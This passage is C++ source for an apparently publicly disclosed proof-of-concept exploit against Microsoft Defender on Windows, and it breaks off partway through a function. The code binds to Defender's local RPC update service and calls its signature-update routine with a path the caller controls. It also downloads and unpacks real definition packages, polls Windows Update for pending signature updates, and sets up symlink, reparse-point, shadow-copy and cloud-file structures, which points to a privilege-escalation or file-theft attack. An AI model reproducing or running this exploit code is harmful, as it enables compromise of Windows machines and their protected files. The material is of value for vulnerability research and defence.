// Special thanks to Tom Gallagher, Igor Tsyganskiy and Jeremy Tinder for making this PoC publicly disclosed !!!

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <Lmcons.h>
#include <wininet.h>
#include <string.h>
#include <fdi.h>
#include <fcntl.h>
#include <winternl.h>
#include <conio.h>
#include <Shlwapi.h>
#include <vector>
#include <ktmw32.h>
#include <wuapi.h>
#include <ntstatus.h>
#include <cfapi.h>
#include <aclapi.h>
#include "windefend_h.h"

/*
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/provider.h>
#include <openssl/hmac.h>
*/
#include "offreg.h"
#define _NTDEF_
#include <ntsecapi.h>
#include <sddl.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Cabinet.lib")
#pragma comment(lib, "Wuguid.lib")
#pragma comment(lib,"CldApi.lib")

static void LogV(const char* fmt, ...);


/// NT routines and definitions
HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
	PHANDLE            DirectoryHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	) = (NTSTATUS(WINAPI*)(
		PHANDLE            DirectoryHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes
		))GetProcAddress(hm, "NtOpenDirectoryObject");;
NTSTATUS(WINAPI* _NtQueryDirectoryObject)(
	HANDLE  DirectoryHandle,
	PVOID   Buffer,
	ULONG   Length,
	BOOLEAN ReturnSingleEntry,
	BOOLEAN RestartScan,
	PULONG  Context,
	PULONG  ReturnLength
	) = (NTSTATUS(WINAPI*)(
		HANDLE  DirectoryHandle,
		PVOID   Buffer,
		ULONG   Length,
		BOOLEAN ReturnSingleEntry,
		BOOLEAN RestartScan,
		PULONG  Context,
		PULONG  ReturnLength
		))GetProcAddress(hm, "NtQueryDirectoryObject");
NTSTATUS(WINAPI* _NtSetInformationFile)(
	HANDLE                 FileHandle,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass
	) = (NTSTATUS(WINAPI*)(
		HANDLE                 FileHandle,
		PIO_STATUS_BLOCK       IoStatusBlock,
		PVOID                  FileInformation,
		ULONG                  Length,
		FILE_INFORMATION_CLASS FileInformationClass
		))GetProcAddress(hm, "NtSetInformationFile");

#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))


typedef struct _FILE_DISPOSITION_INFORMATION_EX {
	ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
	UNICODE_STRING Name;
	UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;

typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR  DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

//////////////// NT DEF END


// definitions of structures used by threads that invoke WD RPC calls
struct WDRPCWorkerThreadArgs
{
	HANDLE hevent;
	RPC_STATUS res;
	error_status_t serverstatus;
	wchar_t* dirpath;
};

typedef struct tagMPCOMPONENT_VERSION {
	ULONGLONG      Version;
	ULARGE_INTEGER UpdateTime;
} MPCOMPONENT_VERSION, * PMPCOMPONENT_VERSION;

typedef struct tagMPVERSION_INFO {
	MPCOMPONENT_VERSION Product;
	MPCOMPONENT_VERSION Service;
	MPCOMPONENT_VERSION FileSystemFilter;
	MPCOMPONENT_VERSION Engine;
	MPCOMPONENT_VERSION ASSignature;
	MPCOMPONENT_VERSION AVSignature;
	MPCOMPONENT_VERSION NISEngine;
	MPCOMPONENT_VERSION NISSignature;
	MPCOMPONENT_VERSION Reserved[4];
} MPVERSION_INFO, * PMPVERSION_INFO;

typedef union Version {
	struct {
		WORD major;
		WORD minor;
		WORD build;
		WORD revision;
	};
	ULONGLONG QuadPart;
};
//////////////////


// structures and global vars used by definition update functions
void* cabbuff2 = NULL;
DWORD cabbuffsz = 0;
struct CabOpArguments {
	ULONG index;
	char* filename;
	size_t ptroffset;
	char* buff;
	DWORD FileSize;
	CabOpArguments* first;
	CabOpArguments* next;
};

struct UpdateFiles {
	char filename[MAX_PATH];
	void* filebuff;
	DWORD filesz;
	bool filecreated;
	UpdateFiles* next;
};
///////////////////////////////////////


// structures and global vars used by volume shadow copy functions
struct cldcallbackctx {

	HANDLE hnotifywdaccess;
	HANDLE hnotifylockcreated;
	wchar_t filename[MAX_PATH];
};

struct LLShadowVolumeNames
{
	wchar_t* name;
	LLShadowVolumeNames* next;
};

struct cloudworkerthreadargs {
	HANDLE hlock;
	HANDLE hcleanupevent;
	HANDLE hvssready;
};
///////////////////////////////////////



//////////////////////////////////////////////////////////////////////
// Functions required by RPC
/////////////////////////////////////////////////////////////////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
//////////////////////////////////////////////////////////////////////
// Functions required by RPC end
/////////////////////////////////////////////////////////////////////




//////////////////////////////////////////////////////////////////////
// WD RPC functions
/////////////////////////////////////////////////////////////////////
void CallWD(WDRPCWorkerThreadArgs* args)
{
	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
	RPC_WSTR StringBinding = NULL;
	RPC_STATUS rpcres = RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding);
	if (rpcres != RPC_S_OK)
	{
		args->res = rpcres;
		if (args->hevent)
			SetEvent(args->hevent);
		return;
	}
	RPC_BINDING_HANDLE bindhandle = 0;
	rpcres = RpcBindingFromStringBindingW(StringBinding, &bindhandle);
	RpcStringFreeW(&StringBinding);
	if (rpcres != RPC_S_OK)
	{
		args->res = rpcres;
		if (args->hevent)
			SetEvent(args->hevent);
		return;
	}
	// PoC might fail here with 0x8050A003 from time to time, this means the update that the PoC is attempting to perform isn't the right one for this code, bail out anyway and wait for the right update.
	error_status_t errstat = 0;
	//printf("Calling ServerMpUpdateEngineSignature...\n");
	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
	args->res = stat;
	args->serverstatus = errstat;
	RpcBindingFree(&bindhandle);
	if (args->hevent)
		SetEvent(args->hevent);

}

DWORD WINAPI WDCallerThread(void* args)
{
	if (!args)
		return ERROR_BAD_ARGUMENTS;
	CallWD((WDRPCWorkerThreadArgs*)args);
	return ERROR_SUCCESS;

}
//////////////////////////////////////////////////////////////////////
// WD RPC functions end
/////////////////////////////////////////////////////////////////////




//////////////////////////////////////////////////////////////////////
// WD definition update functions
/////////////////////////////////////////////////////////////////////

CabOpArguments* CUST_FNOPEN(const char* filename, int oflag, int pmode)
{

	CabOpArguments* cbps = (CabOpArguments*)malloc(sizeof(CabOpArguments));
	ZeroMemory(cbps, sizeof(CabOpArguments));
	cbps->buff = (char*)cabbuff2;
	cbps->FileSize = cabbuffsz;
	return cbps;
}

INT CUST_FNSEEK(HANDLE hf,
	long offset,
	int origin)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (origin == SEEK_SET)
			CabOpArgs->ptroffset = offset;
		if (origin == SEEK_CUR)
			CabOpArgs->ptroffset += offset;
		if (origin == SEEK_END)
			CabOpArgs->ptroffset += CabOpArgs->FileSize;

		return CabOpArgs->ptroffset;

	}

	return -1;
}


UINT CUST_FNREAD(CabOpArguments* hf,
	void* const buffer,
	unsigned const buffer_size)
{

	if (hf)
	{
		CabOpArguments* CabOpArgs = (CabOpArguments*)hf;
		if (CabOpArgs->buff)
		{

			memmove(buffer, &CabOpArgs->buff[CabOpArgs->ptroffset], buffer_size);
			CabOpArgs->ptroffset += buffer_size;
			//CabOpArgs->ReadBytes += buffer_size;
			return buffer_size;
		}
	}

	return NULL;
}

UINT CUST_FNWRITE(CabOpArguments* hf,
	const void* buffer,
	unsigned int count)
{

	if (hf)
	{
		if (hf->buff) {
			memmove(&hf->buff[hf->ptroffset], buffer, count);
			hf->ptroffset += count;
			return count;
		}
	}


	return NULL;
}

INT CUST_FNCLOSE(CabOpArguments* fnFileClose)
{

	free(fnFileClose);
	return 0;
}

VOID* CUST_FNALLOC(size_t cb)
{
	return malloc(cb);
}

VOID CUST_FNFREE(void* buff)
{
	free(buff);
}

INT_PTR CUST_FNFDINOTIFY(
	FDINOTIFICATIONTYPE fdinotify, PFDINOTIFICATION    pfdin
) {

	////printf("_FNFDINOTIFY : %d\n", fdinotify);
	wchar_t newfile[MAX_PATH] = { 0 };
	wchar_t filename[MAX_PATH] = { 0 };
	HANDLE hfile = NULL;
	ULONG rethandle = 0;
	CabOpArguments** ptr = NULL;
	CabOpArguments* lcab = NULL;
	switch (fdinotify)
	{
	case fdintCOPY_FILE:
		if (_stricmp(pfdin->psz1, "MpSigStub.exe") == 0)
			return NULL;

		ptr = (CabOpArguments**)pfdin->pv;
		lcab = *ptr;
		if (lcab == NULL) {
			lcab = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			ZeroMemory(lcab, sizeof(CabOpArguments));
			lcab->first = lcab;
			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			ZeroMemory(lcab->buff, lcab->FileSize);


		}
		else
		{


			lcab->next = (CabOpArguments*)malloc(sizeof(CabOpArguments));
			ZeroMemory(lcab->next, sizeof(CabOpArguments));
			lcab->next->first = lcab->first;
			lcab = lcab->next;

			lcab->filename = (char*)malloc(strlen(pfdin->psz1) + sizeof(char));
			ZeroMemory(lcab->filename, strlen(pfdin->psz1) + sizeof(char));
			memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
			lcab->FileSize = pfdin->cb;
			lcab->buff = (char*)malloc(lcab->FileSize);
			ZeroMemory(lcab->buff, lcab->FileSize);
		}

		lcab->first->index++;
		*ptr = lcab;



		return (INT_PTR)lcab;
		break;
	case fdintCLOSE_FILE_INFO:
		return TRUE;
		break;
	default:
		return 0;
	}
	return 0;
}

void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData, ULONG cbRawData, ULONG* cabsz)
{
	if (cbRawData < sizeof(IMAGE_DOS_HEADER))
	{
		return 0;
	}

	if (pvRawData->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return 0;
	}

	ULONG e_lfanew = pvRawData->e_lfanew, s = e_lfanew + sizeof(IMAGE_NT_HEADERS);

	if (e_lfanew >= s || s > cbRawData)
	{
		return 0;
	}

	PIMAGE_NT_HEADERS pinth = (PIMAGE_NT_HEADERS)RtlOffsetToPointer(pvRawData, e_lfanew);



	if (pinth->Signature != IMAGE_NT_SIGNATURE)
	{
		return 0;
	}

	ULONG SizeOfImage = pinth->OptionalHeader.SizeOfImage, SizeOfHeaders = pinth->OptionalHeader.SizeOfHeaders;

	s = e_lfanew + SizeOfHeaders;

	if (SizeOfHeaders > SizeOfImage || SizeOfHeaders >= s || s > cbRawData)
	{
		return 0;
	}

	s = FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + pinth->FileHeader.SizeOfOptionalHeader;

	if (s > SizeOfHeaders)
	{
		return 0;
	}

	ULONG NumberOfSections = pinth->FileHeader.NumberOfSections;

	PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)RtlOffsetToPointer(pinth, s);

	ULONG Size;

	if (NumberOfSections)
	{
		if (e_lfanew + s + NumberOfSections * sizeof(IMAGE_SECTION_HEADER) > SizeOfHeaders)
		{
			return 0;
		}

		do
		{
			if (Size = min(pish->Misc.VirtualSize, pish->SizeOfRawData))
			{
				union {
					ULONG VirtualAddress, PointerToRawData;
				};

				VirtualAddress = pish->VirtualAddress, s = VirtualAddress + Size;

				if (VirtualAddress > s || s > SizeOfImage)
				{
					return 0;
				}

				PointerToRawData = pish->PointerToRawData, s = PointerToRawData + Size;

				if (PointerToRawData > s || s > cbRawData)
				{
					return 0;
				}

				char rsrc[] = ".rsrc";
				if (memcmp(pish->Name, rsrc, sizeof(rsrc)) == 0)
				{
					typedef struct _IMAGE_RESOURCE_DIRECTORY2 {
						DWORD   Characteristics;
						DWORD   TimeDateStamp;
						WORD    MajorVersion;
						WORD    MinorVersion;
						WORD    NumberOfNamedEntries;
						WORD    NumberOfIdEntries;
						IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];
					} IMAGE_RESOURCE_DIRECTORY2, * PIMAGE_RESOURCE_DIRECTORY2;

					PIMAGE_RESOURCE_DIRECTORY2 pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(pvRawData, pish->PointerToRawData);

					PIMAGE_RESOURCE_DIRECTORY2 prsrc = pird;
					PIMAGE_RESOURCE_DIRECTORY_ENTRY pirde = { 0 };
					PIMAGE_RESOURCE_DATA_ENTRY pdata = 0;

					while (pird->NumberOfNamedEntries + pird->NumberOfIdEntries)
					{




						pirde = &pird->DirectoryEntries[0];
						if (!pirde->DataIsDirectory)
						{
							pdata = (PIMAGE_RESOURCE_DATA_ENTRY)RtlOffsetToPointer(prsrc, pirde->OffsetToData);
							pdata->OffsetToData -= pish->VirtualAddress - pish->PointerToRawData;
							void* cabfile = RtlOffsetToPointer(pvRawData, pdata->OffsetToData);
							if (cabsz)
								*cabsz = pdata->Size;
							return cabfile;
						}
						pird = (PIMAGE_RESOURCE_DIRECTORY2)RtlOffsetToPointer(prsrc, pirde->OffsetToDirectory);
					}
					break;




				}



			}

		} while (pish++, --NumberOfSections);
	}
	return NULL;

}

static const wchar_t UPDATE_CACHE_NAME[] = L"mpam-fe-x64.exe";

static bool BuildUpdateCachePath(wchar_t* cachepath, DWORD cachechars)
{
	DWORD len = GetModuleFileNameW(NULL, cachepath, cachechars);
	if (!len || len >= cachechars)
		return false;

	wchar_t* slash = wcsrchr(cachepath, L'\\');
	if (!slash)
		return false;
	slash[1] = L'\0';

	if (wcslen(cachepath) + wcslen(UPDATE_CACHE_NAME) + 1 > cachechars)
		return false;
	wcscat(cachepath, UPDATE_CACHE_NAME);
	return true;
}

static bool ReadUpdateCache(const wchar_t* cachepath, void** outbuff, DWORD* outsize)
{
	HANDLE file = CreateFileW(cachepath, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return false;

	LARGE_INTEGER size = { 0 };
	if (!GetFileSizeEx(file, &size) || size.QuadPart <= 0 || size.QuadPart > MAXDWORD)
	{
		CloseHandle(file);
		return false;
	}

	DWORD total = (DWORD)size.QuadPart;
	BYTE* data = (BYTE*)malloc(total);
	if (!data)
	{
		CloseHandle(file);
		return false;
	}

	DWORD done = 0;
	while (done < total)
	{
		DWORD remaining = total - done;
		DWORD chunk = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
		DWORD got = 0;
		if (!ReadFile(file, data + done, chunk, &got, NULL) || !got)
		{
			free(data);
			CloseHandle(file);
			return false;
		}
		done += got;
	}

	CloseHandle(file);
	*outbuff = data;
	*outsize = total;
	return true;
}

static bool WriteUpdateCache(const wchar_t* cachepath, const void* buff, DWORD size)
{
	wchar_t temppath[MAX_PATH] = { 0 };
	if (wcslen(cachepath) + 5 > MAX_PATH)
	{
		SetLastError(ERROR_BUFFER_OVERFLOW);
		return false;
	}
	wsprintfW(temppath, L"%s.tmp", cachepath);

	HANDLE file = CreateFileW(temppath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return false;

	const BYTE* data = (const BYTE*)buff;
	DWORD done = 0;
	DWORD saveerror = ERROR_SUCCESS;
	while (done < size)
	{
		DWORD remaining = size - done;
		DWORD chunk = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
		DWORD written = 0;
		if (!WriteFile(file, data + done, chunk, &written, NULL) || !written)
		{
			saveerror = GetLastError();
			break;
		}
		done += written;
	}

	if (saveerror == ERROR_SUCCESS && !FlushFileBuffers(file))
		saveerror = GetLastError();
	CloseHandle(file);

	if (saveerror == ERROR_SUCCESS && !MoveFileExW(temppath, cachepath,
		MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
		saveerror = GetLastError();

	if (saveerror != ERROR_SUCCESS)
	{
		DeleteFileW(temppath);
		SetLastError(saveerror);
		return false;
	}
	return true;
}


UpdateFiles* GetUpdateFiles(int* filecount = NULL)
{



	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	char data[0x1000] = { 0 };
	DWORD index = 0;
	DWORD sz = sizeof(data);
	bool res2 = 0;
	wchar_t filesz[50] = { 0 };
	LARGE_INTEGER li = { 0 };
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	wchar_t envstr[MAX_PATH] = { 0 };
	wchar_t mpampath[MAX_PATH] = { 0 };
	HANDLE hmpap = NULL;
	void* exebuff = NULL;
	DWORD readsz = 0;
	HANDLE hmapping = NULL;
	void* mappedbuff = NULL;
	HRSRC hres = NULL;
	DWORD ressz = NULL;
	HGLOBAL cabbuff = NULL;
	HANDLE htransaction = NULL;
	char fname[] = "update.cab";
	ERF erfstruct = { 0 };
	HFDI hcabctx = NULL;
	bool extractres = false;
	DWORD totalsz = 0;
	HANDLE hmpeng = NULL;
	CabOpArguments* CabOpArgs = NULL;
	CabOpArguments* mpenginedata = NULL;
	void* dllview = NULL;
	char** filesmtrx = 0;
	UpdateFiles* firstupdt = NULL;
	UpdateFiles* current = NULL;
	wchar_t cachepath[MAX_PATH] = { 0 };
	bool havecachepath = BuildUpdateCachePath(cachepath, MAX_PATH);
	bool loadedfromcache = false;

	DWORD nbytes = 0;


	if (havecachepath && ReadUpdateCache(cachepath, &exebuff, &sz))
	{
		loadedfromcache = true;
		LogV("Using cached update package: %ws (%lu bytes)\n", cachepath, sz);
	}
	else
	{
		if (havecachepath && GetFileAttributesW(cachepath) != INVALID_FILE_ATTRIBUTES)
			LogV("Cached package could not be read; downloading a fresh copy.\n");

		LogV("Downloading update package from Microsoft CDN...\n");
		hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
		if (!hint)
			goto cleanup;

		hint2 = InternetOpenUrl(hint, L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64", NULL, NULL, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
		if (!hint2)
			goto cleanup;

		res2 = HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index);
		if (!res2)
			goto cleanup;

		wcscpy(filesz, (LPWSTR)data);
		sz = _wtoi(filesz);
		li.QuadPart = sz;

		exebuff = malloc(sz);
		if (!exebuff)
			goto cleanup;
		ZeroMemory(exebuff, sz);

		readsz = 0;
		while (readsz < sz)
		{
			DWORD got = 0;
			if (!InternetReadFile(hint2, (BYTE*)exebuff + readsz, sz - readsz, &got) || !got)
				goto cleanup;
			readsz += got;
		}

		InternetCloseHandle(hint);
		hint = NULL;
		InternetCloseHandle(hint2);
		hint2 = NULL;
	}
	//printf("Done.\n");
	mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);



	if (!mappedbuff)
	{
		//printf("Failed to retrieve cabinet file from downloaded file.\n");
		goto cleanup;
	}
	//printf("Cabinet file mapped at 0x%p\n", mappedbuff);




	cabbuff2 = mappedbuff;
	cabbuffsz = ressz;

	//printf("Extracting cab file content...\n");
	hcabctx = FDICreate((PFNALLOC)CUST_FNALLOC, CUST_FNFREE, (PFNOPEN)CUST_FNOPEN, (PFNREAD)CUST_FNREAD, (PFNWRITE)CUST_FNWRITE, (PFNCLOSE)CUST_FNCLOSE, (PFNSEEK)CUST_FNSEEK, cpuUNKNOWN, &erfstruct);
	if (!hcabctx)
	{
		//printf("Failed to create cab context, error : 0x%x", erfstruct.erfOper);
		goto cleanup;
	}



	extractres = FDICopy(hcabctx, (char*)"\\update.cab", (char*)"C:\\temp", NULL, (PFNFDINOTIFY)CUST_FNFDINOTIFY, NULL, &CabOpArgs);
	if (!extractres)
	{
		//printf("Failed to extract cab file, error : 0x%x", erfstruct.erfOper);
		goto cleanup;
	}
	if (!loadedfromcache && havecachepath)
	{
		if (WriteUpdateCache(cachepath, exebuff, sz))
			LogV("Saved update package cache: %ws\n", cachepath);
		else
			LogV("Could not save update cache (continuing), error: %lu\n", GetLastError());
	}
	FDIDestroy(hcabctx);
	hcabctx = NULL;

	if (!CabOpArgs)
	{
		//printf("Unexpected empty buffer after extracting cab file.\n");
		return NULL;
	}

	CabOpArgs = CabOpArgs->first;

	firstupdt = (UpdateFiles*)malloc(sizeof(UpdateFiles));
	ZeroMemory(firstupdt, sizeof(UpdateFiles));
	current = firstupdt;
	while (CabOpArgs)
	{
		if (filecount)
			*filecount += 1;
		strcpy(current->filename, CabOpArgs->filename);
		DWORD buffsz = CabOpArgs->FileSize;
		current->filebuff = malloc(buffsz);
		memmove(current->filebuff, CabOpArgs->buff, buffsz);
		current->filesz = buffsz;
		CabOpArgs = CabOpArgs->next;
		if (CabOpArgs)
		{
			current->next = (UpdateFiles*)malloc(sizeof(UpdateFiles));
			ZeroMemory(current->next, sizeof(UpdateFiles));
			current = current->next;
		}

	}
	//printf("Cab file content extracted.\n");


cleanup:

	if (CabOpArgs)
	{
		CabOpArguments* current = CabOpArgs->first;
		while (current)
		{
			free(current->buff);
			free(current->filename);
			CabOpArgs = current;
			current = current->next;
			free(CabOpArgs);
		}
	}
	if (hint)
		InternetCloseHandle(hint);
	
	if (hint2)
		InternetCloseHandle(hint2);
	if (exebuff)
		free(exebuff);

	return firstupdt;


}

bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
{



	IUpdateSearcher* updsrch = 0;
	bool updatesfound = false;
	IUpdateSession* updsess = 0;
	CLSID clsid;
	HRESULT hr = CLSIDFromProgID(OLESTR("Microsoft.Update.Session"), &clsid);
	ISearchResult* srchres = 0;
	IUpdateCollection* updcollection = 0;
	LONG updnum = 0;
	BSTR title = 0;
	BSTR desc = 0;
	ICategoryCollection* catcoll = 0;
	ICategory* cat = 0;
	BSTR catname = 0;
	IUpdate* upd = 0;
	bool comini = CoInitialize(NULL) == 0;
	if (!comini) {
		//printf("Failed to initialize COM\n");
		*criterr = true;
		return false;
	}




	hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IUpdateSession, (LPVOID*)&updsess);

	if (!updsess)
	{
		//printf("CoCreateInstance returned a NULL pointer.\n");
		*criterr = true;
		goto cleanup;
	}
	////printf("CoCreateInstance : 0x%p\n", updsess);


	hr = updsess->CreateUpdateSearcher(&updsrch);
	if (hr)
	{
		//printf("IUpdateSearcher->CreateUpdateSearcher failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}

	if (!updsrch)
	{
		//printf("IUpdateSearcher->CreateUpdateSearcher returned a NULL pointer.\n");
		*criterr = true;
		goto cleanup;
	}
	////printf("IUpdateSearcher->CreateUpdateSearcher : 0x%p\n", updsrch);
	////printf("Checking for updates, please wait...\n");
	hr = updsrch->Search(SysAllocString(L""), &srchres);
	if (hr)
	{
		//printf("ISearchResult->Search failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}
	////printf("ISearchResult->Search : 0x%p\n", srchres);

	hr = srchres->get_Updates(&updcollection);
	if (hr)
	{
		//printf("IUpdateCollection->get_Updates failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}

	if (!updcollection)
	{
		//printf("IUpdateCollection->get_Updates returned a NULL pointer.\n");
		*criterr = true;
		goto cleanup;
	}
	////printf("IUpdateCollection->get_Updates : 0x%p\n", updcollection);


	hr = updcollection->get_Count(&updnum);
	if (hr)
	{
		//printf("IUpdateCollection->get_Count failed with error : 0x%0.X", hr);
		*criterr = true;
		goto cleanup;
	}
	////printf("Updates count : %d\n", updnum);

	for (LONG i = 0; i < updnum; i++)
	{
		if (upd)
		{
			upd->Release();
			upd = 0;
		}
		title = 0;
		desc = 0;
		catname = 0;
		////printf("_________________________________________\n");
		bool IsWdUdpate = false;
		bool IsSigUpdate = false;
		hr = updcollection->get_Item(i, &upd);
		if (hr)
		{
			//printf("IUpdateCollection->get_Item failed with error : 0x%0.X", hr);
			*criterr = true;
			goto cleanup;
		}
		if (!upd)
		{
			//printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
			*criterr = true;
			goto cleanup;
		}
		////printf("Update number : %d\n", i + 1);

		hr = upd->get_Title(&title);
		if (hr)
		{
			//printf("IUpdateCollection->get_Title failed with error : 0x%0.X", hr);
			continue;
		}
		if (!title)
		{
			//printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
			continue;
		}
		title[SysStringLen(title)] = NULL;
		////printf("Title : %ws\n", title);

		/*
		desc = 0;
		upd->get_Description(&desc);
		if (!desc)
		{
			//printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
			continue;
		}
		desc[SysStringLen(desc)] = NULL;
		//printf("Description : %ws\n", desc);
		*/
		catcoll = 0;
		hr = upd->get_Categories(&catcoll);
		if (!catcoll)
		{
			//printf("IUpdateCollection->get_Categories returned a NULL pointer.\n");
			continue;
		}
		LONG catcount = 0;
		hr = catcoll->get_Count(&catcount);
		for (LONG j = 0; j < catcount; j++)
		{
			cat = 0;
			hr = catcoll->get_Item(j, &cat);
			if (!cat)
			{
				//printf("ICategoryCollection->get_Item returned NULL pointer.\n");
				continue;
			}
			catname = 0;
			cat->get_Name(&catname);
			catname[SysStringLen(catname)] = NULL;
			////printf("Category name : %ws\n", catname);
			if (catname)
			{
				if (!IsWdUdpate)
					IsWdUdpate = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
				if (!IsSigUpdate)
					IsSigUpdate = _wcsicmp(catname, L"Definition Updates") == 0;

			}

		}
		updatesfound = IsWdUdpate && IsSigUpdate;

		// Filter out platform/engine updates — the downloaded mpam-fe.exe contains
		// signature definition files (.vdm), so the RPC call ServerMpUpdateEngineSignature
		// will reject them with 0x8050A003 if the pending update is actually a platform
		// update (KB4052623) rather than a signature update (KB2267602).
		// Platform updates contain "antimalware platform" in the title.
		// Signature updates contain "Security Intelligence" in the title.
		if (updatesfound && title)
		{
			bool IsPlatformUpdate = wcsstr(title, L"antimalware platform") != NULL ||
				wcsstr(title, L"Antimalware Platform") != NULL ||
				wcsstr(title, L"antimalware Platform") != NULL;
			bool IsSignatureUpdate = wcsstr(title, L"Security Intelligence") != NULL ||
				wcsstr(title, L"Definition") != NULL;

			if (IsPlatformUpdate)
			{
				//printf("Skipping platform update: %ws\n", title);
				updatesfound = false;
			}
			else if (!IsSignatureUpdate)
			{
				//printf("Skipping non-signature update: %ws\n", title);
				updatesfound = false;
			}
		}

		if (updatesfound)
			break;
	}

	if (updatesfound && updatetitle) {
		memmove(updatetitle, title, lstrlenW(title) * sizeof(wchar_t));
	}

cleanup:
	if (updcollection)
		updcollection->Release();
	if (srchres)
		srchres->Release();
	if (updsrch)
		updsrch->Release();
	if (updsess)
		updsess->Release();
	if (upd)
		upd->Release();
	CoUninitialize();


	return updatesfound;
}

//////////////////////////////////////////////////////////////////////
// WD definition update functions end
/////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////
// Volume shadow copy functions
/////////////////////////////////////////////////////////////////////

void rev(char* s) {

	// Initialize l and r pointers
	int l = 0;
	int r = strlen(s) - 1;
	char t;

	// Swap characters till l and r meet
	while (l < r) {

		// Swap characters
		t = s[l];
		s[l] = s[r];
